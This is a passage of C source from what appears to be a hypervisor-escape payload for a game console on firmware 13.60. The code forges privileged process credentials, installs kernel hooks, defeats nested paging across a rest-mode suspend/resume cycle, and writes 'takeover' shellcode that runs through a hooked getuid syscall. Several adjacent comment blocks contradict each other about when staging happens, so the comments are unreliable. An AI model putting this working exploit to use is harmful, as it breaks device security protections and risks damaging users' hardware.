 * in which case the cookie is never stamped and the poll below reports it.
 *
 * Everything after the cookie check is dead code from the earlier design in
 * which break_hv cleared NPT and returned to the guest; it installs a second
 * khook on SYS_GETUID and drives a takeover blob. Kept because it is the only
 * remaining record of that path, not because anything calls it - if the cookie
 * appears, hv_boot has already abandoned the guest and there is no process left
 * to run this. Do not build on it without checking against Byepervisor first.
 */
int hv_defeat_1360_post_resume(void) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x100];
  uint64_t cookie = 0;
  int ret;

  /* Log entry unconditionally. Without this the only way to tell "the process
   * never came back" from "it came back and is waiting" was the absence of a
   * message that is printed at the very end of a ten minute poll. */
  notify("13.60: post-resume: entered (g_armed=%d, oracle=%#lx).\n", g_armed,
         (unsigned long)g_oracle);

  if (!g_armed) {
    notify("13.60: post-resume called but vector was never armed.\n");
    return -1;
  }

  notify("13.60: post-resume: polling for the cookie at %#lx.\n",
         (unsigned long)g_oracle);

  /* Poll for the cookie, and if it does not appear, ask for another suspend and
   * try again - for as long as it takes.
   *
   * The hook is one-shot: it disarms itself when it fires and stays armed when it
   * does not, so a cycle in which nothing happened needs nothing beyond another
   * suspend. Whether the breakpoint is delivered depends on the core the resume
   * reaches, which this process does not control, and the measured behaviour is
   * that it lands on some attempts and not others. Offering another resume is the
   * only practical answer, and far cheaper than sending the payload again.
   *
   * Every poll is reported. An earlier version reported every fifteenth, which is
   * one line every thirty seconds - and a wake in which nothing fired ends five to
   * ten seconds later, so the second line never arrived and the terminal looked
   * identical whether the payload had died at the suspend or come back and was
   * polling. */
  /* One window long enough for the console to actually suspend - it takes about
   * fourteen seconds from the request - and a wall-clock check to notice when we
   * come back.
   *
   * Re-asking for a suspend every few seconds was measured to be fatal: the console
   * never gets to sleep because the request keeps restarting the countdown, and the
   * platform eventually cuts the power with the payload still polling. But waiting a
   * full minute after a wake is just as wrong the other way, because a wake in which
   * the hook did not fire is followed by the power going off five to ten seconds
   * later - so the next attempt never starts.
   *
   * The clock is what separates the two cases. A suspend and resume makes the wall
   * clock jump by far more than the one second this loop sleeps for, so a jump means
   * we are back and the request should go out immediately; no jump means we are
   * still awake and waiting for the console to go down, and the request should not
   * be repeated. */
  {
    struct timeval prev, now;
    long long elapsed;

    gettimeofday(&prev, NULL);

    for (int attempt = 1; cookie == 0; attempt++) {
      for (int i = 0; i < 60 && cookie == 0; i++) {
        gettimeofday(&now, NULL);
        elapsed = (long long)(now.tv_sec - prev.tv_sec);
        prev = now;

        if (elapsed > 5 && attempt > 1) {
          notify("13.60: post-resume: back from a suspend (clock jumped %llds) - "
                 "asking for rest mode again.\n", elapsed);
#ifdef MANUAL_SLEEP
          notify("13.60: MANUAL_SLEEP: put the console to sleep now (PS Button -> "
                 "Power -> Enter Rest Mode).\n");
#else
          enter_rest_mode();
#endif
        }

        cookie = kread64(g_oracle);
        if (cookie == 0) {
          notify("13.60: post-resume: still no cookie (%d/60, %ds), attempt %d.\n",
                 i + 1, i, attempt);
          pin_to_core(HOOK_CORE);
          sceKernelSleep(1);
        }
      }
      if (cookie == 0)
        notify("13.60: post-resume: attempt %d done, still armed.\n", attempt);
    }
  }

  notify("13.60: NPT disabled (cookie %#lx); launching takeover.\n", cookie);

  /* Credentials may not have survived the power cycle. */
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);

  /* Read the Linux images and rebuild the cave now, after the resume.
   *
   * This has to happen here rather than before the sleep. Measured on 13.60:
   * with fetch_linux() - which maps and fills about 41 MB from the USB stick -
   * running before the suspend, the console powers off a few seconds after the
   * resume; with it skipped, the console comes back with NP_ENABLE cleared. The
   * reference payload does not touch any of that before sleeping, and this
   * function was already written to rebuild the cave here, because "the
   * suspend/resume cycle may have reused the physical pages holding the identity
   * table and the Linux images".
   *
   * The cookie check above is what makes this safe: the cookie is only stamped
   * during the resume, so by the time we get here the console has already woken
   * up and nothing heavy sits between the hook arming and the suspend. */
  /* Build the cave now, not before the suspend.
   *
   * hv_defeat_1360() deliberately arms the hook and does nothing else, because
   * writing these 41 MB into the cave at physical 4 GiB before sleeping is what
   * stops the console coming back. The image buffers fetch_linux() filled are
   * still valid - the process is frozen across S3 and its anonymous memory is
   * part of what the suspend saves - so they are copied in from here. No file is
   * touched: /data/ is not readable again after the wake.
   *
   * This is also where the reference 3.00-7.61 flow builds its cave, in
   * boot_linux(), which runs during the ACPI wakeup. */
  /* Retry the staging: the storage is not necessarily ready the moment this
   * process is thawed. Measured on 13.60, the first attempt right after the wake
   * opened bzImage and then read zero bytes from offset 0 of a 12 MB file - the
   * metadata comes back with the filesystem, the data needs the device. So give
   * it time instead of giving up. */
  int staged = -1;
  for (int attempt = 1; attempt <= 30; attempt++) {
    staged = stage_hv_boot();
    if (staged == 0)
      break;
    notify("13.60: staging attempt %d/30 failed; retrying in 2s.\n", attempt);
    sleep(2);
  }
  if (staged) {
    notify("13.60: could not stage the cave after the resume.\n");
    return -1;
  }
  g_cave_staged = 1;
  verify_hv_staging();

  kwrite(g_payload_va, takeover_bin, takeover_bin_len);

  ret = kh_init(&hook, by_read, by_write, ktext, kdlsym(KERNEL_SYM_DATA_CAVE),
                HOOK_IST);
  if (ret) {
    notify("13.60: takeover kh_init failed (%d).\n", ret);
    return ret;
  }

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);
  kh_set_resume_rip(&hook, g_payload_va);
  kh_set_resume_rdi(&hook, ktext);      /* takeover blob arg0 = ktext */
  kh_set_resume_rsi(&hook, kdldmap(0)); /* takeover blob arg1 = dmap  */

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);

  ret = kh_install(&hook, &chain);
  if (ret) {
    notify("13.60: takeover hook install failed (%d).\n", ret);
    return ret;
  }

  kh_trigger(&hook);

  notify("13.60: takeover armed; firing getuid() -> shellcode_hv.\n");
  syscall(SYS_getuid);

  notify("13.60: getuid() returned; takeover did not fire.\n");
  return -1;
}

int hv_defeat_1360(void) {
  uint64_t cave_addr;
  uint64_t kernel_pmap;
  int ret;

  if (check_offsets()) {
    notify("13.60: high-FW vector is not ready (offsets incomplete).\n");
    return -1;
  }

  /* Kernel memory R/W without tripping the guest permission checks. */
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);

  cave_addr = kdlsym(KERNEL_SYM_DATA_CAVE);
  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);

  if (kread64(cave_addr + CAVE_STATE_OFF) == STATE_ARMED) {
    /* The cave lives in RAM and S3 is suspend-to-RAM, so an armed hook survives a
     * rest-mode cycle and this process can be started again into a state that is
     * already set up. Rebuild the runtime state the rest of the flow reads - the
     * oracle the poll watches and the address the AP payload is copied from - or
     * post_resume() reports "vector was never armed" and does nothing, which is a
     * silent failure rather than a safe one. */
    notify("13.60: hook already armed (state survived); reusing the staged cave.\n");
    g_oracle = kdlsym(KERNEL_SYM_DATA_CAVE) + KH_OFF_USER;
    g_payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
    g_armed = 1;
    return 0;
  }

  notify("13.60: escaping hypervisor (Byepervisor khook)...\n");

  escape_kernel_text(kernel_pmap);
  map_payload_executable(kernel_pmap);

  /* SKIP_HV_STAGING is a diagnostic: the escape mirrors Byepervisor's payload,
   * which survives the resume, and everything added on top of it lives here.
   * stage_hv_boot() writes about 60 MB into the cave at physical 4 GiB - inside
   * the guest's own RAM - so it is the prime suspect for a resume that gets
   * further with break_hv and then still dies. Build with SKIP_HV_STAGING=1 to
   * leave the cave alone and see whether the console comes back. */
  /* Build the cave now, while the images are still readable, and then let go of
   * the 41 MB they occupy.
   *
   * The cave is physical memory at cave_hv_paging and S3 is suspend-to-RAM, so it
   * is still there after the wake - that is what the whole design relies on.
   * Holding the images in this process instead is what breaks the resume:
   * measured on 13.60, with fetch_linux()'s buffers alive across the suspend the
   * console powers off a few seconds after the wake, from the USB stick and from
   * /data/ alike, with malloc and with mmap alike; with nothing loaded before the
   * suspend it comes back with NP_ENABLE cleared.
   *
   * So stage here and free the mappings. post_resume() then has nothing heavy to
   * do and only verifies what is already in place. */
  /* Staging deliberately does not happen here.
   *
   * stage_hv_boot() writes about 41 MB into the cave at physical 4 GiB, which is
   * memory the guest still owns. Measured on 13.60 that alone is enough to stop
   * the console coming back: with it the resume powers the console off, without
   * it the resume completes and NP_ENABLE is cleared, and those two runs were
   * otherwise identical.
   *
   * The reference 3.00-7.61 flow agrees - it builds the cave in boot_linux(),
   * which runs during the ACPI wakeup, after the suspend rather than before.
   *
   * hv_defeat_1360_post_resume() does it instead, from the image buffers that
   * fetch_linux() left in this process, which survive the suspend. */
  /* One two-byte read, done here because this is the last place the log can be
   * written. G_VBIOS is the only offset on this path that no dump ever
   * confirmed - it lies past the end of the kernel image the tools have - so if
   * it is wrong the post-resume copy would silently put rubbish at 0xC0000. */
  {
    uint8_t sig[2] = {0, 0};
    kread(ktext + env_offset.G_VBIOS, sig, sizeof(sig));
    vbios_signature_ok = (sig[0] == 0x55 && sig[1] == 0xAA);
    notify("13.60: G_VBIOS at %#lx starts %02x %02x -> %s.\n",
           (unsigned long)(ktext + env_offset.G_VBIOS), sig[0], sig[1],
           vbios_signature_ok ? "valid option ROM, will copy after the resume"
                              : "NOT an option ROM, will not touch 0xC0000");
  }

  notify("13.60: cave staging deferred until after the resume.\n");
  ret = install_resume_hook(cave_addr);
  if (ret) {
    notify("13.60: hook install failed (khook rc=%d).\n", ret);
    return -1;
  }

  notify("13.60: hypervisor escape armed. Rest mode -> payload.\n");
  return 0;
}
